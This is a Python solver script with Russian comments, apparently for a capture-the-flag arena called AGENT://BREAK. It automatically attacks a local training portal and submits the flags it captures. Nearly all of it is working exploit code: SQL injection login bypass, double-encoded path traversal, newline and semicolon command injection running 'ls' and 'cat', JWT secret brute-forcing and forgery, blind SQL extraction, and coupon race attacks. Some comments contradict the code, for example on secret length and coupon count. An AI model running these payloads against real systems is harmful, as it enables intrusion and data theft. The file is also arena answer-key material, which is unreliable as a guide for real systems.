#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Бот-агент для AGENT://BREAK v2.1 (hardened): реально эксплуатирует 10 уязвимостей
портала OMEGA CORP и сдаёт флаги на арену.

    python3 bot_pwn.py [имя] [задержка_на_уровень_сек]

Каждая функция x_* — настоящий эксплойт. Усложнения v2.1 отражены в коде:
uid из ops, двойное кодирование пути, sha256-токен с датой (проверяется по
тест-вектору), подпись роли, инъекция через %0A, брутфорс JWT 4 символа в
потоках, бинарный поиск по rate-limited оракулу, залпы по пяти промокодам,
четырёхрубежная цепочка с вычисляемым PIN и свежим Bearer-токеном.
"""
import base64
import hashlib
import hmac
import itertools
import json
import os
import random
import re
import sys
import threading
import time
import urllib.error
import urllib.parse
import urllib.request

BASE = os.environ.get("AB_URL", "http://127.0.0.1:8100")
FLAG_RE = re.compile(r"FLAG-(\d+)-[0-9a-f]+")
ROOMFLAG_RE = re.compile(r"ROOMFLAG-[0-9a-f]+")
COOKIE = {}
RESP_HEADERS = {}
SALT = None          # кэш соли из portal.js (уровни 4, 5, 10)
JWT_SECRET = None    # кэш секрета api v2 (уровни 7, 10)


def req(path, data=None, headers=None, form=None):
    hdrs = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AgentBreak/2.2"}
    if COOKIE:
        hdrs["Cookie"] = "; ".join("%s=%s" % kv for kv in COOKIE.items())
    if headers:
        hdrs.update(headers)
    body = None
    if form is not None:
        body = urllib.parse.urlencode(form).encode()
        hdrs["Content-Type"] = "application/x-www-form-urlencoded"
    elif data is not None:
        body = json.dumps(data).encode()
        hdrs["Content-Type"] = "application/json"
    r = urllib.request.Request(BASE + path, data=body,
                               method="POST" if body is not None else "GET", headers=hdrs)
    try:
        resp = urllib.request.urlopen(r, timeout=120)
        global RESP_HEADERS
        RESP_HEADERS = dict(resp.headers.items())
        sc = resp.headers.get("Set-Cookie") or ""
        for part in sc.split(";"):
            if part.strip().startswith("psid="):
                COOKIE["psid"] = part.strip()[5:]
        return resp.status, resp.read().decode("utf-8", "replace")
    except urllib.error.HTTPError as e:
        try:
            return e.code, e.read().decode("utf-8", "replace")
        except Exception:  # noqa
            return e.code, ""


def sha256(s):
    return hashlib.sha256(s.encode()).hexdigest()


def md5(s):
    return hashlib.md5(s.encode()).hexdigest()


def internal_headers():
    return {"X-Omega-Internal": md5(get_salt() + "internal")}


def get_salt():
    global SALT
    if not SALT:
        _, js = req("/static/portal.js")
        SALT = re.search(r'RESET_SALT\s*=\s*"([^"]+)"', js).group(1)
    return SALT


# ---------------------------------------------------------------- эксплойты

def x1_sqli_admin():
    """Уровень 1: SQL-инъекция в логине."""
    req("/login", form={"login": "admin' -- ", "pass": "неважно"})
    _, home = req("/")
    m = FLAG_RE.search(home)
    assert m and m.group(1) == "1", "не вижу FLAG-1: %s" % home[:200]
    return m.group(0)


def x2_idor():
    """Уровень 2 (ULTRA): ops за внутренним заголовком; uid оттуда."""
    _, ops = req("/ops", headers=internal_headers())
    uid = re.search(r"guardian: создан uid=(\d+)", ops).group(1)
    _, prof = req("/profile?id=" + uid)
    m = FLAG_RE.search(prof)
    assert m and m.group(1) == "2", "не вижу FLAG-2: %s" % prof[:300]
    return m.group(0)


def x3_traversal():
    """Уровень 3: фильтр режет ../ до конца — двойное URL-кодирование
    (легаси-компонент декодирует путь повторно уже после фильтра).
    .%2e%2f -> ../  (точка + закодированные точка и слэш)."""
    payload = ".%2e%2f.%2e%2fflags%2fflag3.txt"
    _, body = req("/files/get?name=" + urllib.parse.quote(payload, safe=""))
    m = re.search(r"FLAG-3-[0-9a-f]+", body)
    assert m, "двойное кодирование не прошло: %s" % body[:200]
    return m.group(0)


def x4_predictable_token():
    """Уровень 4 (ULTRA): в ops есть только контрольный вектор demo без формата.
    Перебираем кандидатов формата офлайн, пока не совпадёт с вектором."""
    salt = get_salt()
    _, ops = req("/ops", headers=internal_headers())
    vector = re.search(r"контрольный вектор = ([0-9a-f]{64})", ops).group(1)
    day_dash = time.strftime("%Y-%m-%d", time.gmtime())
    day_compact = time.strftime("%Y%m%d", time.gmtime())
    candidates = []
    for d in (day_dash, day_compact):
        candidates += [
            lambda l, d=d: "%s-%s-%s" % (salt, l, d),
            lambda l, d=d: "%s%s%s" % (salt, l, d),
            lambda l, d=d: "%s_%s_%s" % (salt, l, d),
            lambda l, d=d: "%s:%s:%s" % (salt, l, d),
            lambda l, d=d: "%s+%s+%s" % (salt, l, d),
            lambda l, d=d: "%s-%s" % (l, d) + salt,
            lambda l, d=d: d + salt + l,
        ]
    fmt = None
    for c in candidates:
        try:
            if sha256(c("demo")) == vector:
                fmt = c
                break
        except Exception:
            continue
    assert fmt, "формат токена не подобран по вектору"
    token = sha256(fmt("guardian"))
    _, body = req("/reset?user=guardian&token=" + token)
    m = re.search(r"FLAG-4-[0-9a-f]+", body)
    assert m, "токен не принят: %s" % body[:200]
    return m.group(0)


def x5_signed_role():
    """Уровень 5: роль admin надо подписать: sign = md5(SALT:role)."""
    salt = get_salt()
    _, js = req("/static/portal.js")
    key = re.search(r'API_KEY\s*=\s*"([^"]+)"', js).group(1)
    sign = md5("%s:admin" % salt)
    _, body = req("/svc/notify?key=%s&role=admin&sign=%s" % (key, sign))
    m = re.search(r"FLAG-5-[0-9a-f]+", body)
    assert m, "подпись не прошла: %s" % body[:200]
    return m.group(0)


def x6_cmd_injection():
    """Уровень 6: ;|&`$ под фильтром — инъектимся переводом строки (%0A).
    Имя файла флага случайное: сначала ls, потом cat."""
    _, ls = req("/tools/ping?host=" + urllib.parse.quote("127.0.0.1\nls", safe=""))
    fname = re.search(r"flag6_[0-9a-f]+\.txt", ls)
    assert fname, "ls не показал файл флага: %s" % ls[:300]
    _, body = req("/tools/ping?host=" +
                  urllib.parse.quote("127.0.0.1\ncat " + fname.group(0), safe=""))
    m = re.search(r"FLAG-6-[0-9a-f]+", body)
    assert m, "cat не сработал: %s" % body[:300]
    return m.group(0)


def _brute_jwt(h, p, sig):
    """Брутфорс секрета HS256: 5 символов [a-z0-9] = 52M, в 8 потоков (офлайн)."""
    charset = "abcdefghijkmnopqrstuvwxyz0123456789"
    msg = ("%s.%s" % (h, p)).encode()
    target = sig.lower()
    found = []
    lock = threading.Lock()

    def worker(prefixes):
        for pre in prefixes:
            for rest in itertools.product(charset, repeat=4):
                cand = pre + "".join(rest)
                if hmac.compare_digest(hmac.new(cand.encode(), msg, hashlib.sha256).hexdigest(), target):
                    with lock:
                        found.append(cand)
                    return

    buckets = list(charset)
    threads = []
    for i in range(8):
        t = threading.Thread(target=worker, args=(buckets[i::8],))
        t.start()
        threads.append(t)
    for t in threads:
        t.join()
    return found[0] if found else None


def x7_jwt_forge():
    """Уровень 7: брутфорс 4-символьного секрета, подделка svc-internal + iat."""
    global JWT_SECRET
    _, body = req("/svc2/token")
    token = json.loads(body)["token"]
    h, p, sig = token.split(".")
    secret = JWT_SECRET or _brute_jwt(h, p, sig)
    assert secret, "секрет JWT не подобран"
    JWT_SECRET = secret

    def b64u(o):
        return base64.urlsafe_b64encode(json.dumps(o).encode()).decode().rstrip("=")

    fh, fp = b64u({"alg": "HS256", "typ": "JWT"}), \
        b64u({"user": "svc-internal", "role": "admin", "iat": int(time.time())})
    fs = hmac.new(secret.encode(), ("%s.%s" % (fh, fp)).encode(), hashlib.sha256).hexdigest()
    _, vault = req("/svc2/vault?token=%s.%s.%s" % (fh, fp, fs))
    m = re.search(r"FLAG-7-[0-9a-f]+", vault)
    assert m, "подделка не прошла: %s" % vault[:200]
    return m.group(0)


def x8_blind_sqli():
    """Уровень 8: blind SQLi с rate-limit 120/мин — только бинарный поиск."""
    charset = sorted(set("FLAG-0123456789abcdef"))
    probes = {"n": 0}

    def oracle(inj):
        while True:
            _, body = req("/search?q=" + urllib.parse.quote(inj))
            if body.startswith("слишком много"):
                wait = float(re.search(r"([\d.]+) сек", body).group(1))
                time.sleep(min(max(wait, 0.5) + 0.2, 61))
                continue
            probes["n"] += 1
            m = re.search(r"Найдено: <b>(\d+)</b>", body)
            return m and int(m.group(1)) > 0

    # длина: бинарный поиск по LENGTH
    lo, hi = 1, 48
    while lo < hi:
        mid = (lo + hi) // 2
        if oracle("zzq%%' OR (SELECT LENGTH(secret) FROM vault)>=%d -- " % mid):
            lo = mid
        else:
            hi = mid - 1
    length = lo

    secret = ""
    for pos in range(1, length + 1):
        lo, hi = 0, len(charset) - 1
        while lo < hi:
            mid = (lo + hi) // 2
            if oracle("zzq%%' OR SUBSTR((SELECT secret FROM vault),%d,1)<='%s' -- "
                      % (pos, charset[mid])):
                hi = mid
            else:
                lo = mid + 1
        secret += charset[lo]
    assert secret.startswith("FLAG-8-"), "вытащил хрень: %r (проб: %d)" % (secret, probes["n"])
    return secret


def x9_race():
    """Уровень 9: пять промокодов из ops, залп потоками на каждое окно гонки."""
    _, ops = req("/ops", headers=internal_headers())
    codes = re.findall(r"OMEGA-20-[0-9A-F]{4}", ops)
    assert len(codes) == 6, "не нашёл 6 промокодов: %s" % ops[:300]

    def fire(code):
        req("/wallet/coupon?code=" + code)

    for volley in range(30):
        for code in codes:
            ts = [threading.Thread(target=fire, args=(code,)) for _ in range(30)]
            [t.start() for t in ts]
            [t.join() for t in ts]
        _, wallet = req("/wallet")
        bal = int(re.search(r"баланс: <b>(\d+)</b>", wallet).group(1))
        if bal >= 1000:
            break
    _, body = req("/wallet/buy?item=premium")
    m = re.search(r"FLAG-9-[0-9a-f]+", body)
    assert m, "не хватило баланса: %s" % body[:300]
    return m.group(0)


def _mine_pow(token, prefix="00000"):
    """ULTRA-ядро: ищем nonce, чтобы sha256(token+nonce) начинался с prefix."""
    import struct
    n = 0
    t0 = time.time()
    base = token.encode()
    while True:
        nonce = str(n)
        if hashlib.sha256(base + nonce.encode()).hexdigest().startswith(prefix):
            return nonce
        n += 1
        if n % 200000 == 0 and time.time() - t0 > 120:
            raise RuntimeError("PoW не майнится за 120с")


def x10_nightmare():
    """ULTRA-ЯДРО: PoW + 4 рубежа. 1) админ-сессия 2) X-Omega-Internal
    3) PIN = sha256('omega-'+SALT+'-'+МинУТA_UTC)[:6] 4) свежий Bearer svc-internal."""
    salt = get_salt()
    assert JWT_SECRET, "нужен секрет JWT с уровня 7"

    def b64u(o):
        return base64.urlsafe_b64encode(json.dumps(o).encode()).decode().rstrip("=")

    fh, fp = b64u({"alg": "HS256", "typ": "JWT"}), \
        b64u({"user": "svc-internal", "role": "admin", "iat": int(time.time())})
    fs = hmac.new(JWT_SECRET.encode(), ("%s.%s" % (fh, fp)).encode(), hashlib.sha256).hexdigest()
    base_headers = {
        "X-Omega-Internal": md5(salt + "internal"),
        "Authorization": "Bearer %s.%s.%s" % (fh, fp, fs),
    }

    # рубеж 5: получить PoW-токен и решить его
    minute = time.strftime("%Y%m%d%H%M", time.gmtime())
    minute_prev = time.strftime("%Y%m%d%H%M", time.gmtime(time.time() - 60))
    pin = sha256("omega-%s-%s" % (salt, minute))[:6]
    pin_prev = sha256("omega-%s-%s" % (salt, minute_prev))[:6]
    h = dict(base_headers)
    _, body = req("/admin/panel?pin=" + pin, headers=h)
    token = RESP_HEADERS.get("X-PoW-Token")
    if token:
        nonce = _mine_pow(token)
        h.update({"X-PoW-Token": token, "X-PoW-Nonce": nonce})
        _, body = req("/admin/panel?pin=" + pin, headers=h)
    m = re.search(r"FLAG-10-[0-9a-f]+", body)
    if not m and pin != pin_prev:  # смена минуты на границе
        h2 = dict(h)
        _, body = req("/admin/panel?pin=" + pin_prev, headers=h2)
        m = re.search(r"FLAG-10-[0-9a-f]+", body)
    assert m, "ядро не пало: %s" % body[:400]
    return m.group(0)


# ---------------------------------------------------------------- кампания

def run_campaign(agent, delay=0.0, verbose=True):
    st, body = req("/arena/api/register", data={"agent": agent})
    reg = json.loads(body)
    aid = reg["aid"]
    if verbose:
        print("[%s] регистрация на арену: aid=%s" % (agent, aid))

    steps = []

    def solve(name, fn):
        steps.append((name, fn()))
        flag = steps[-1][1]
        st, body = req("/arena/api/submit", data={"aid": aid, "flag": flag})
        res = json.loads(body)
        if not res.get("принят"):
            raise RuntimeError("флаг %s не принят: %s" % (flag, res))
        if verbose:
            print("[%s] флаг %2d %-32s сдан на %6.2fs%s" % (
                agent, len(steps), name, res["время_с_старта"],
                "  ⚡FIRST BLOOD" if res.get("first_blood") else ""))
        if res.get("ЗАВЕРШЕНО"):
            if verbose:
                print("[%s] ★ ВСЕ 10 ФЛАГОВ: %s сек (ранг %d) — онлайн открыт" % (
                    agent, res["total_time"], res["rank"]))
            return res
        if delay:
            time.sleep(delay * (0.6 + random.random()))
        return None

    for name, fn in [
        ("SQL-инъекция /login", x1_sqli_admin),
        ("IDOR по uid из ops", x2_idor),
        ("двойное кодирование /files", x3_traversal),
        ("sha256-токен с датой /reset", x4_predictable_token),
        ("подпись роли /api/notify", x5_signed_role),
        ("инъекция %0A /tools/ping", x6_cmd_injection),
        ("брутфорс JWT 4 симв /api2", x7_jwt_forge),
        ("blind SQLi бинпоиском /search", x8_blind_sqli),
        ("залпы промокодов /wallet", x9_race),
        ("четыре рубежа /admin/panel", x10_nightmare),
    ]:
        res = solve(name, fn)
        if res:
            return res
    raise RuntimeError("кампания не завершилась")


# ---------------------------------------------------------------- взлом комнат

def b64u(o):
    return base64.urlsafe_b64encode(json.dumps(o).encode()).decode().rstrip("=")


def crack_room(ctype, site):
    """Эксплойты для мини-сайтов онлайн-комнат (без изменений с v2)."""
    if ctype == "sqli":
        _, b = req(site + "login", form={"user": "admin' -- ", "pass": "x"})
    elif ctype == "traversal":
        _, b = req(site + "file?name=" + urllib.parse.quote("....//secrets"))
        fname = re.search(r"([a-z]{3,10}\.txt)", b).group(1)
        _, b = req(site + "file?name=" + urllib.parse.quote("....//secrets/" + fname))
    elif ctype == "cmdi":
        _, b = req(site + "run?cmd=" + urllib.parse.quote("127.0.0.1; ls"))
        fname = re.search(r"([a-z]{3,10}\.txt)", b).group(1)
        _, b = req(site + "run?cmd=" + urllib.parse.quote("127.0.0.1; cat " + fname))
    elif ctype == "jwt":
        _, b = req(site + "token")
        token = json.loads(b)["token"]
        h, p, sig = token.split(".")

        def s3(sec):
            return hmac.new(sec.encode(), ("%s.%s" % (h, p)).encode(),
                            hashlib.sha256).hexdigest()

        secret = next("".join(t) for t in itertools.product("abcdefghijklmnopqrstuvwxyz", repeat=3)
                      if hmac.compare_digest(s3("".join(t)), sig))
        fh, fp = b64u({"alg": "HS256"}), b64u({"user": "x", "role": "admin"})
        fs = hmac.new(secret.encode(), ("%s.%s" % (fh, fp)).encode(), hashlib.sha256).hexdigest()
        _, b = req(site + "vault?token=%s.%s.%s" % (fh, fp, fs))
    elif ctype == "race":
        def fire():
            req(site + "coupon?code=ROOM-50")
        for _ in range(4):
            _, b = req(site)
            m = re.search(r"баланс (\d+) из 100", b)
            if m and int(m.group(1)) >= 100:
                break
            ts = [threading.Thread(target=fire) for _ in range(40)]
            [t.start() for t in ts]
            [t.join() for t in ts]
        _, b = req(site + "buy?item=flag")
    else:
        return None
    m = ROOMFLAG_RE.search(b)
    return m.group(0) if m else None


if __name__ == "__main__":
    name = sys.argv[1] if len(sys.argv) > 1 else "Agent-%03d" % random.randint(1, 999)
    delay = float(sys.argv[2]) if len(sys.argv) > 2 else 0.0
    run_campaign(name, delay)
